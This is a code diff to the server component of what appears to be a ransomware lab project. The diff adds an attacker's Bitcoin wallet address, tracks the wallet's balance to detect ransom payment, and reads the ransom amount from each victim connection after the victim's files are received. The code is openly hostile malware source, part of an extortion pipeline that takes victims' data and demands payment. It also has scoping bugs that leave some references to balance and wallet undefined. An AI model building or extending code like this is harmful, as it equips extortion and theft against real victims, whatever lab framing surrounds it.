@@ -26,12 +26,13 @@ class Server:
     VICTIMS = []
     WORKING_DIR = '/home/attacker/Lab-On-Offensive-Attack/VictimsData'
     CODE_PATH = '/home/attacker/Lab-On-Offensive-Attack/mal.py'
-
-  
+    WALLET_ADDRESS = "tb1qud9u85mcjcwndgwjqgcw69neah9z22kp7uw9wv" #Attackers crypto wallet address
+    initial_balance = cryptowallet.get_balance(WALLET_ADDRESS) #The initial amount of btc's that we have
+    bitcoin_needed = 0.0; #Instantiate how much bitcoin is needed
 
     def __init__(self, port):
         self._port = port
-        # Initialize the socket for connection using TCP protocol.
+        # Initialize the socket for connection using TCP protocol
         self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self._transfer_done = False
 
@@ -115,25 +116,15 @@ class Server:
 
 
     #Checks if a user has paid, if somebody has paid then it returns their id, if nobody has it returns null
-    def check_if_user_paid():
-        wallet_address = "tb1qud9u85mcjcwndgwjqgcw69neah9z22kp7uw9wv" #Attackers crypto wallet address
-        initial_balance =  cryptowallet.get_balance(wallet_address)
-
-        #TODO: Repolace with actual table
-        table_with_owed_money = [["host1", 0.23], ["host2", 0.001], ["host3", 00.2]]
-
-        user_that_paid = None
-
-        current_balance = cryptowallet.get_balance(wallet_address)
-        change = current_balance - initial_balance
+    def check_if_user_paid(self):
         
-        for row in table_with_owed_money:
-            if (change == row[1]):
-                user_that_paid = row[0]
-                table_with_owed_money.remove(row) #remove from owed money table
+        current_balance =  cryptowallet.get_balance(wallet_address)
 
+        amount_paid = current_balance - initial_balance 
+        
+        paid  =  amount_paid == bitcoin_needed
 
-        return user_that_paid
+        return paid
 
 
     def attack(self):
@@ -174,9 +165,10 @@ class Server:
                     while not self._transfer_done:
                         self.receive_victim_files(connection, victim_mac)
                         if self._transfer_done == True:
-                            print("yessss")
+                            bitcoin_needed = float(base64.b64decode(connection.recv(Server.MAX_SIZE)).decode(Server.FORMAT))
                             break
                     break
+                   
                 
                 
 
